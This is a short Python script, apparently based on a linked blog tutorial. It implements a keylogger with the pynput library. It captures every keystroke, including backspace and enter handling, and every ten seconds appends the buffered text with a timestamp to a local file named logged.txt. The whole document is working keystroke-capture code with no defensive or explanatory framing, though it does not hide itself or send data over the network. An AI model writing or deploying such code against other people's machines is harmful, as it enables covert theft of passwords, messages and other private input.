from pynput import keyboard
from pynput.keyboard import Listener as kbListener
from threading import Timer
from datetime import datetime

logged = ""
time = datetime.now()

def on_press(key):
    global logged
    stripped = str(key).replace("'", "")

    try:
        if key == keyboard.Key.backspace:
            if len(logged) != 0:    
                logged = logged[:-1]
                print(logged)
        elif key == keyboard.Key.enter:
            logged += "\n"
        else:
            logged += stripped

    except AttributeError:
        print('special key {0} pressed'.format(
            key))
    
def send():
    global logged

    with open("logged.txt", "a") as log:
        w = log.write(f'\n{time}: {logged}')
        print(logged)
    Timer(10.0, send).start()

if __name__ == '__main__':
    Timer(10.0, send).start()
    listener = kbListener(on_press=on_press)
    listener.start()
    listener.join()

    


# https://headfullofciphers.com/2020/08/16/simple-python-keylogger-with-pynput/ reference